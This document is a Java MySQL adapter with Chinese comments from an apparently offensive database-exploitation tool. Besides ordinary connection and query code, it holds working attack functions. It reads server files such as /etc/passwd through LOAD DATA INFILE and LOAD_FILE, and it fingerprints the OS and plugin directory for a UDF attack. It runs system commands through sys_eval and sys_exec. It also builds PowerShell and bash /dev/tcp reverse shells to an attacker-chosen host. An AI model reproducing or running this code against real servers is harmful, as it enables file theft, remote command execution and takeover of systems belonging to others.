package database;

import com.zaxxer.hikari.HikariConfig;
import com.zaxxer.hikari.HikariDataSource;
import util.SqlHelpers;

import java.sql.*;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * MySQL 适配器（JDBC + HikariCP 连接池）。
 *
 * <p>安全基线：默认优先建立 TLS（useSSL=true/requireSSL=false），
 * 服务端不支持时回退明文连接并记录提示（与 PostgreSQL 默认 prefer 语义一致）。
 */
public class mysql implements DatabaseAdapter {

    private static final Logger LOG = Logger.getLogger(mysql.class.getName());
    private static final int QUERY_TIMEOUT_SECONDS = 30;

    private final String host;
    private final String port;
    private final String database;
    private final String username;
    private final String password;

    private HikariDataSource pool = null;
    /** TLS 探测结果（null=未探测；true=支持；false=已回退明文）。 */
    private Boolean tlsSupported = null;

    public mysql(String host, String port, String database, String username, String password) {
        this.host = host;
        this.port = port;
        this.database = database;
        this.username = username;
        this.password = password;
        /**
         * 反馈的 bug, 已修复
         * 显式注册 MySQL JDBC 驱动，避免打包时有些类加载环境下未自动加载
         */
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
        } catch (ClassNotFoundException e) {
            LOG.log(Level.SEVERE, "[!] MySQL JDBC 驱动未找到: " + e.getMessage(), e);
        }
    }

    public static String readFiles(String path, String type) {
        if (path == null || path.isEmpty()) {
            path = "/etc/passwd";
        }

        path = path.replace("'", "''");

        return switch (type) {
            case "LOAD_DATA" -> String.format("""
                    CREATE DATABASE IF NOT EXISTS udf_load_dada_7788941 CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
                    USE udf_load_dada_7788941;
                    DROP TABLE IF EXISTS udf_load_dada_test_import_7788941;
                    CREATE TABLE udf_load_dada_test_import_7788941 (name VARCHAR(255));
                    LOAD DATA INFILE '%s' INTO TABLE udf_load_dada_test_import_7788941 FIELDS TERMINATED BY ',' LINES TERMINATED BY '\\n';
                    SELECT * FROM udf_load_dada_test_import_7788941;
                    """, path);
            case "LOAD_FILE" ->
                    String.format("SELECT CONVERT(LOAD_FILE('%s') USING utf8) AS udf_load_file_test_import_7788941;", path);
            default -> String.format("""
                    DROP TABLE IF EXISTS udf_load_dada_test_import_7788941;
                    CREATE TABLE udf_load_dada_test_import_7788941 (name VARCHAR(255));
                    LOAD DATA INFILE '%s' INTO TABLE udf_load_dada_test_import_7788941 FIELDS TERMINATED BY ',' LINES TERMINATED BY '\\n';
                    SELECT * FROM udf_load_dada_test_import_7788941;
                    """, path);
        };

    }

    // ----------------------------------------------------------- 连接与池化

    private String baseUrl() {
        String db = (database == null || database.isEmpty()) ? "mysql" : urlSafe(database);
        return "jdbc:mysql://" + host + ":" + port + "/" + db;
    }

    private static String urlSafe(String s) {
        return s.replaceAll("[^A-Za-z0-9_$.-]", "");
    }

    private String tlsUrl(boolean tls) {
        return baseUrl()
                + (tls
                ? "?useSSL=true&requireSSL=false&connectTimeout=15000&socketTimeout=60000"
                : "?useSSL=false&connectTimeout=15000&socketTimeout=60000")
                + "&allowMultiQueries=true";
    }

    /** 探测 TLS 可用性（仅探测一次），返回最终使用的 JDBC URL。 */
    private synchronized String effectiveUrl() {
        if (tlsSupported == null) {
            try (Connection tmp = DriverManager.getConnection(tlsUrl(true), username, password)) {
                tlsSupported = Boolean.TRUE;
                LOG.info("[+] MySQL TLS 连接成功（useSSL=true）");
            } catch (SQLException e) {
                tlsSupported = Boolean.FALSE;
                LOG.warning("[!] MySQL TLS 不可用，回退明文连接: " + e.getMessage());
            }
        }
        return tlsSupported ? tlsUrl(true) : tlsUrl(false);
    }

    private synchronized HikariDataSource pool() {
        if (pool == null || pool.isClosed()) {
            HikariConfig cfg = new HikariConfig();
            cfg.setJdbcUrl(effectiveUrl());
            cfg.setUsername(username);
            cfg.setPassword(password);
            cfg.setPoolName("turacos-mysql-" + host + ":" + port);
            cfg.setMaximumPoolSize(4);
            cfg.setMinimumIdle(1);
            cfg.setConnectionTimeout(15000);
            cfg.setValidationTimeout(5000);
            cfg.setAutoCommit(true);
            pool = new HikariDataSource(cfg);
        }
        return pool;
    }

    private Connection getConnection() throws SQLException {
        return pool().getConnection();
    }

    @Override
    public void close() {
        if (pool != null) {
            pool.close();
            pool = null;
        }
    }

    // ------------------------------------------------------------- 接口方法

    @Override
    public boolean testConnection() {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
        } catch (ClassNotFoundException e) {
            LOG.log(Level.SEVERE, "[!] MySQL JDBC 驱动未找到: " + e.getMessage(), e);
        }
        // 复用 TLS 探测结果，避免每次测试都试两个 URL
        try (Connection tmp = DriverManager.getConnection(effectiveUrl(), username, password)) {
            return tmp != null && !tmp.isClosed();
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 连接测试失败: " + e.getMessage());
            return false;
        }
    }

    @Override
    public List<String> getDatabases() {
        List<String> dbList = new ArrayList<>();
        try (Connection con = getConnection();
             Statement stmt = con.createStatement();
             ResultSet rs = stmt.executeQuery("SHOW DATABASES")) {
            while (rs.next()) {
                dbList.add(rs.getString(1));
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 获取数据库列表失败: " + e.getMessage());
        }
        return dbList;
    }

    @Override
    public List<String> getSchemas() {
        List<String> schemas = new ArrayList<>();
        schemas.add("default");
        return schemas;
    }

    @Override
    public List<String> getTables(String schema) {
        List<String> tables = new ArrayList<>();
        String sql = "SELECT table_name FROM information_schema.tables WHERE table_schema = ? ORDER BY table_name";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            ps.setString(1, database);
            try (ResultSet rs = ps.executeQuery()) {
                while (rs.next()) {
                    tables.add(rs.getString("table_name"));
                }
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 获取表列表失败: " + e.getMessage());
        }
        return tables;
    }

    @Override
    public List<String> getColumnNames(String schema, String table) {
        List<String> columns = new ArrayList<>();
        String sql = "SELECT column_name FROM information_schema.columns WHERE table_schema = ? AND table_name = ? ORDER BY ordinal_position";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            ps.setString(1, database);
            ps.setString(2, table);
            try (ResultSet rs = ps.executeQuery()) {
                while (rs.next()) {
                    columns.add(rs.getString("column_name"));
                }
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 获取列信息失败: " + e.getMessage());
        }
        return columns;
    }

    @Override
    public List<List<Object>> getTopRows(String schema, String table, int limit) {
        List<List<Object>> rows = new ArrayList<>();
        int safeLimit = SqlHelpers.clampLimit(limit);
        // 标识符经方言安全引用；行数使用参数绑定
        String sql = "SELECT * FROM " + SqlHelpers.quoteMy(table) + " LIMIT ?";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            ps.setInt(1, safeLimit);
            try (ResultSet rs = ps.executeQuery()) {
                ResultSetMetaData meta = rs.getMetaData();
                int colCount = meta.getColumnCount();
                while (rs.next()) {
                    List<Object> row = new ArrayList<>();
                    for (int i = 1; i <= colCount; i++) {
                        row.add(rs.getObject(i));
                    }
                    rows.add(row);
                }
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 查询表数据失败: " + e.getMessage());
        }
        return rows;
    }

    @Override
    public String getDatabaseInfo() {
        StringBuilder sb = new StringBuilder();
        try (Connection c = getConnection();
             Statement stmt = c.createStatement()) {
            try (ResultSet rs = stmt.executeQuery("SELECT VERSION()")) {
                if (rs.next()) sb.append("[+] Database Version: ").append(rs.getString(1)).append("\n");
            }
            try (ResultSet rs = stmt.executeQuery("SELECT CURRENT_USER()")) {
                if (rs.next()) sb.append("[+] Current User: ").append(rs.getString(1).split("@")[0]).append("\n");
            }
            try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'datadir'")) {
                if (rs.next()) sb.append("[+] Data directory: ").append(rs.getString(2)).append("\n");
            }
            try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'plugin_dir'")) {
                if (rs.next()) sb.append("[+] Plugin dir: ").append(rs.getString(2)).append("\n");
            }
            try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'secure_file_priv'")) {
                if (rs.next()) sb.append("[+] secure_file_priv: ").append(rs.getString(2)).append("\n");
            }
        } catch (SQLException e) {
            sb.append("[!] \uD83D\uDCA5获取数据库信息失败: ").append(e.getMessage()).append("\n");
        }
        return sb.toString();
    }

    public List<String> udf_init() {
        List<String> info = new ArrayList<>();
        try (Connection c = getConnection();
             Statement stmt = c.createStatement()) {
            try (ResultSet rs = stmt.executeQuery("SELECT @@version_compile_os")) {
                String os = rs.next() ? rs.getString(1).toLowerCase() : "other";
                if (os.contains("win")) os = "windows";
                else if (os.contains("linux")) os = "linux";
                else if (os.contains("mac") || os.contains("darwin")) os = "mac";
                else os = "other";
                info.add(os);
            }
            try (ResultSet rs = stmt.executeQuery("SELECT @@version_compile_machine")) {
                String machine = rs.next() ? rs.getString(1).toLowerCase() : "x86_64";
                String bits = machine.contains("64") ? "64" : "32";
                info.add(bits);
            }
            try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'plugin_dir'")) {
                String pluginDir = rs.next() ? rs.getString(2) : "/tmp/";
                info.add(pluginDir);
            }
            try (ResultSet rs = stmt.executeQuery("SHOW VARIABLES LIKE 'sql_mode'")) {
                String sqlMode = rs.next() ? rs.getString(2) : "";
                info.add(sqlMode);
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] udf_init: " + e.getMessage());
        }
        return info;
    }

    /**
     * 执行任意 SQL（支持多语句）：整串发送 + 逐结果集迭代（见适配器契约说明）。
     */
    @Override
    public String executeSQL(String sql) throws SQLException {
        if (sql == null || sql.trim().isEmpty()) {
            return "[!] SQL语句不能为空！";
        }
        long t0 = System.currentTimeMillis();

        StringBuilder sb = new StringBuilder();
        try (Connection c = getConnection();
             Statement stmt = c.createStatement()) {
            stmt.setQueryTimeout(QUERY_TIMEOUT_SECONDS);
            boolean hasResultSet = stmt.execute(sql.trim());

            while (true) {
                if (hasResultSet) {
                    try (ResultSet rs = stmt.getResultSet()) {
                        ResultSetMetaData meta = rs.getMetaData();
                        int colCount = meta.getColumnCount();
                        while (rs.next()) {
                            for (int i = 1; i <= colCount; i++) {
                                String val = rs.getString(i);
                                if (i > 1) sb.append("\t");
                                sb.append(val != null ? val : "NULL");
                            }
                            sb.append("\n");
                        }
                    }
                } else {
                    int updateCount = stmt.getUpdateCount();
                    if (updateCount == -1) {
                        break;
                    }
                }
                hasResultSet = stmt.getMoreResults();
            }
        } catch (SQLTimeoutException te) {
            return audited("EXEC_SQL", sql, "[!] \uD83D\uDCA5SQL 执行超时: " + te.getMessage() + "\n" + sb, t0);
        } catch (SQLException e) {
            if (sb.length() > 0) sb.append("\n");
            sb.append("[-] ").append(e.getMessage());
        }

        return audited("EXEC_SQL", sql, sb + "\n", t0);
    }

    /** 结构化查询（供合规检查等模块使用）：返回 列名->值 的行列表。 */
    @Override
    public List<Map<String, Object>> queryRows(String sql, String... params) throws SQLException {
        List<Map<String, Object>> rows = new ArrayList<>();
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            for (int i = 0; i < params.length; i++) {
                ps.setString(i + 1, params[i]);
            }
            try (ResultSet rs = ps.executeQuery()) {
                ResultSetMetaData meta = rs.getMetaData();
                int n = meta.getColumnCount();
                while (rs.next()) {
                    Map<String, Object> row = new LinkedHashMap<>();
                    for (int i = 1; i <= n; i++) {
                        row.put(meta.getColumnLabel(i), rs.getObject(i));
                    }
                    rows.add(row);
                }
            }
        }
        return rows;
    }

    private String audited(String action, String detail, String result, long t0) {
        util.AuditLogger.log(action, "MySQL", host, port, database, username, detail, result,
                System.currentTimeMillis() - t0);
        return result;
    }

    // ------------------------------------------------------------ 后渗透辅助

    public boolean reverseShell(String host, int port) throws SQLException {
        if (host == null || host.trim().isEmpty()) {
            throw new IllegalArgumentException("Host cannot be null or empty");
        }

        if (port < 1 || port > 65535) {
            throw new IllegalArgumentException("Port must be between 1 and 65535");
        }

        String os = getOperatingSystem();
        String command = buildReverseShellCommand(host, port, os);

        if (command == null) {
            LOG.warning("Unsupported operating system: " + os);
            return false;
        }

        return executeSystemCommand(command);
    }

    private String getOperatingSystem() {
        try {
            List<String> udfInfo = udf_init();
            return udfInfo != null && !udfInfo.isEmpty() ? udfInfo.get(0) : "unknown";
        } catch (Exception e) {
            LOG.log(Level.WARNING, "[!] Error getting OS info: " + e.getMessage(), e);
            return "unknown";
        }
    }

    private String buildReverseShellCommand(String host, int port, String os) {
        switch (os.toLowerCase()) {
            case "windows":
                return buildWindowsReverseShellCommand(host, port);
            case "linux":
                return buildLinuxReverseShellCommand(host, port);
            default:
                return null;
        }
    }

    private String buildWindowsReverseShellCommand(String host, int port) {
        return "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
    }

    private String buildLinuxReverseShellCommand(String host, int port) {
        return String.format("/bin/bash -c \"/bin/bash -i >& /dev/tcp/%s/%d 0>&1\"", host, port);
    }

    private boolean executeSystemCommand(String command) {
        long t0 = System.currentTimeMillis();
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement("SELECT sys_exec(?);")) {
            ps.setString(1, command);
            ps.execute();
            util.AuditLogger.log("EXEC_CMD", "MySQL", host, port, database, username,
                    command, "sys_exec invoked", System.currentTimeMillis() - t0);
            return true;
        } catch (SQLException e) {
            util.AuditLogger.log("EXEC_CMD", "MySQL", host, port, database, username,
                    command, "FAILED: " + e.getMessage(), System.currentTimeMillis() - t0);
            LOG.log(Level.INFO, "[!] " + e.getMessage());
            return false;
        }
    }


    public static String exCmd(String type, String cmd) {

        if (cmd == null || cmd.isEmpty()) {
            cmd = "whoami";
        }

        String safeCmd = cmd.replace("'", "''");

        String sqlUdf = "SELECT sys_eval('%s');";
        return String.format(sqlUdf, safeCmd);
    }

    /**
     * 直接执行系统命令：优先使用 sys_eval，若 1305 报不存在则回退到 sys_exec
     * 返回标准化文本输出，便于面板展示
     */
    public String executeCommandWithUdfFallback(String cmd) {
        long t0 = System.currentTimeMillis();
        String result = executeCommandWithUdfFallbackInner(cmd);
        util.AuditLogger.log("EXEC_CMD", "MySQL", host, port, database, username,
                cmd, result, System.currentTimeMillis() - t0);
        return result;
    }

    private String executeCommandWithUdfFallbackInner(String cmd) {
        if (cmd == null || cmd.trim().isEmpty()) cmd = "whoami";
        StringBuilder out = new StringBuilder();
        try (Connection c = getConnection()) {
            try (PreparedStatement ps = c.prepareStatement("SELECT sys_eval(?);")) {
                ps.setString(1, cmd);
                boolean has = ps.execute();
                if (has) {
                    try (ResultSet rs = ps.getResultSet()) {
                        while (rs.next()) {
                            String s = rs.getString(1);
                            if (s != null) out.append(s).append("\n");
                        }
                    }
                }
                return out.toString();
            } catch (SQLException e) {
                String msg = e.getMessage() != null ? e.getMessage() : "";
                if (msg.toLowerCase().contains("does not exist") && msg.toLowerCase().contains("sys_eval")
                        || msg.toLowerCase().contains("can't find") && msg.toLowerCase().contains("sys_eval")) {
                    try (PreparedStatement ps2 = c.prepareStatement("SELECT sys_exec(?);")) {
                        String os = getOperatingSystem();
                        String execCmd = cmd;
                        if ("windows".equalsIgnoreCase(os) && !cmd.toLowerCase().startsWith("cmd ")) {
                            execCmd = "cmd /c " + cmd;
                        }
                        ps2.setString(1, execCmd);
                        boolean has2 = ps2.execute();
                        if (has2) {
                            try (ResultSet rs2 = ps2.getResultSet()) {
                                while (rs2.next()) {
                                    String s = rs2.getString(1);
                                    if (s != null) out.append(s).append("\n");
                                }
                            }
                        }
                        return "[!] sys_eval 不可用，已回退 sys_exec（仅返回退出码）\n" + out;
                    } catch (SQLException e2) {
                        return "[-] sys_eval/sys_exec 执行失败: " + e2.getMessage();
                    }
                }
                return "[-] " + msg;
            }
        } catch (SQLException e) {
            return "[-] 执行失败: " + e.getMessage();
        }
    }
}
